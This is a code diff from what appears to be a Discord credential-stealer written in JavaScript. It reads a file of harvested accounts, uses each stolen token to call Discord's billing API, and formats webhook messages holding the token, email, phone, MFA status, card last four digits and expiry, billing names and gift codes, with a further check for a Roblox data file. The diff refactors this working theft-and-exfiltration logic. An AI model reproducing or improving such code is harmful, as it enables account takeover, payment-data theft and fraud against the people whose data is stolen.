@@ -17,7 +17,6 @@ if (!webhook.url || typeof webhook.url !== 'string' || !isValidURL(webhook.url))
 
 const json = async (zipFile) => {
   const ipInfo = async (info) => await require('./ip-info').then(ip => ip[info]);
-  const discordAccountInfo = JSON.parse(readFileSync(join(getTempFolder(), 'Discord.json')).toString());
   const uptime = Math.floor(Math.round(Date.now() / 1000) - os.uptime());
 
   const computerInfoFields = [
@@ -48,73 +47,74 @@ const json = async (zipFile) => {
 
   const fieldsMap = f => ({ name: f[0], value: f[1], inline: typeof f[2] !== 'undefined' ? f[2] : true });
 
-  if (discordAccountInfo.accounts?.length >= 1) {
-    for (const account of discordAccountInfo.accounts) {
-      const haveNitro = account.premium_type !== 0;
-      let nitroSubscriptionEnd = 0;
-      async function getNitroEnd() {
-        try {
+  if (fs.existsSync(join(getTempFolder(), 'Discord.json'))) {
+    const discordAccountInfo = JSON.parse(readFileSync(join(getTempFolder(), 'Discord.json')).toString());
+    if (discordAccountInfo.accounts?.length >= 1) {
+      for (const account of discordAccountInfo.accounts) {
+        const haveNitro = account.premium_type !== 0;
+        let nitroSubscriptionEnd = 0;
+
+        if (haveNitro) {
           const request = await axios.get('https://discord.com/api/v10/users/@me/billing/subscriptions', {
             headers: { Authorization: account.token, 'User-Agent': userAgent }
           });
           nitroSubscriptionEnd = Math.floor(new Date(request.data[0]?.current_period_end).getTime() / 1000);
-        } catch (err) {}
-      }
-      if (haveNitro) await getNitroEnd();
-
-      embeds.push({
-        description: `Token: ${codeBlock(account.token)}`,
-        author: {
-          name: usernameFormat(account.global_name, account.username, account.discriminator),
-          icon_url: account.avatar ? avatarURL(account.id, account.avatar) : defaultAvatar(account.id, account.discriminator),
-          url: `https://discord.com/users/${account.id}`
-        },
-        fields: [
-          ['🆔 ID', code(account.id)],
-          ['📜 Bio', account.bio],
-          ['🌍 Locale', code(account.locale)],
-          ['🔞 NSFW Allowed', account.nsfw_allowed],
-          ['🔐 MFA Enabled', account.mfa_enabled],
-          ['✉️ Email', account.email ? code(account.email) : 'No Email'],
-          ['📞 Phone Number', account.phone ? code(account.phone) : 'No Phone Number'],
-          ['💲 Nitro Subscription', nitroSubscriptionType(account.premium_type) + ((haveNitro && nitroSubscriptionEnd) ? ` (ends <t:${nitroSubscriptionEnd}:R>)` : '')],
-          ['🚩 Flags', accountFlags(account.flags) !== '' ? accountFlags(account.flags) : 'None'],
-        ].map(fieldsMap),
-        color: account.accent_color,
-        thumbnail: {
-          url: account.avatar ? avatarURL(account.id, account.avatar) : defaultAvatar(account.id, account.discriminator)
-        },
-        footer: {
-          text: `Found in ${account.source.replace(account.source[0], account.source[0].toUpperCase())}`
         }
+
+        embeds.push({
+          description: `Token: ${codeBlock(account.token)}`,
+          author: {
+            name: usernameFormat(account.global_name, account.username, account.discriminator),
+            icon_url: account.avatar ? avatarURL(account.id, account.avatar) : defaultAvatar(account.id, account.discriminator),
+            url: `https://discord.com/users/${account.id}`
+          },
+          fields: [
+            ['🆔 ID', code(account.id)],
+            ['📜 Bio', account.bio],
+            ['🌍 Locale', code(account.locale)],
+            ['🔞 NSFW Allowed', account.nsfw_allowed],
+            ['🔐 MFA Enabled', account.mfa_enabled],
+            ['✉️ Email', account.email ? code(account.email) : 'No Email'],
+            ['📞 Phone Number', account.phone ? code(account.phone) : 'No Phone Number'],
+            ['💲 Nitro Subscription', nitroSubscriptionType(account.premium_type) + ((haveNitro && nitroSubscriptionEnd) ? ` (ends <t:${nitroSubscriptionEnd}:R>)` : '')],
+            ['🚩 Flags', accountFlags(account.flags) !== '' ? accountFlags(account.flags) : 'None'],
+          ].map(fieldsMap),
+          color: account.accent_color,
+          thumbnail: {
+            url: account.avatar ? avatarURL(account.id, account.avatar) : defaultAvatar(account.id, account.discriminator)
+          },
+          footer: {
+            text: `Found in ${account.source.replace(account.source[0], account.source[0].toUpperCase())}`
+          }
+        });
+      }
+    }
+
+    if (discordAccountInfo.billing?.length >= 1) {
+      discordAccountInfo.billing.forEach(billing => embeds.push({
+        title: `Discord Account - Billing - ${billingType(billing.type)}`,
+        fields: (billing.type === 1 ? [
+          ['👨 Name', billing.billing_address.name],
+          ['🏴 Country', `${billing.country} :flag_${billing.country.toLowerCase()}:`],
+          ['🔚 Ends in', code(billing.last_4)],
+          ['®️ Brand', billing.brand],
+          ['⛔ Expires in', code(billing.expires_month + '/' + billing.expires_year)]
+        ] : [
+          ['👨 Name', billing.billing_address.name],
+          ['✉️ Email', code(billing.email)],
+          ['🏴 Country', `${billing.country} :flag_${billing.country.toLowerCase()}:`],
+        ]).map(fieldsMap)
+      }));
+    }
+
+    if (discordAccountInfo.gifts?.length >= 1) {
+      embeds.push({
+        title: 'Discord Promotions',
+        description: discordAccountInfo.gifts.map(gift => {
+          return `🎁 **${gift.promotion.outbound_title}**\n🔗 \`\`${gift.code}\`\` ([Redeem](${gift.promotion.outbound_redemption_page_link}))`;
+        }).join('\n')
       });
     }
-  }
-
-  if (discordAccountInfo.billing?.length >= 1) {
-    discordAccountInfo.billing.forEach(billing => embeds.push({
-      title: `Discord Account - Billing - ${billingType(billing.type)}`,
-      fields: (billing.type === 1 ? [
-        ['👨 Name', billing.billing_address.name],
-        ['🏴 Country', `${billing.country} :flag_${billing.country.toLowerCase()}:`],
-        ['🔚 Ends in', code(billing.last_4)],
-        ['®️ Brand', billing.brand],
-        ['⛔ Expires in', code(billing.expires_month + '/' + billing.expires_year)]
-      ] : [
-        ['👨 Name', billing.billing_address.name],
-        ['✉️ Email', code(billing.email)],
-        ['🏴 Country', `${billing.country} :flag_${billing.country.toLowerCase()}:`],
-      ]).map(fieldsMap)
-    }));
-  }
-
-  if (discordAccountInfo.gifts?.length >= 1) {
-    embeds.push({
-      title: 'Discord Promotions',
-      description: discordAccountInfo.gifts.map(gift => {
-        return `🎁 **${gift.promotion.outbound_title}**\n🔗 \`\`${gift.code}\`\` ([Redeem](${gift.promotion.outbound_redemption_page_link}))`;
-      }).join('\n')
-    });
   }
 
   if (fs.existsSync(join(getTempFolder(), 'Roblox.json'))) {
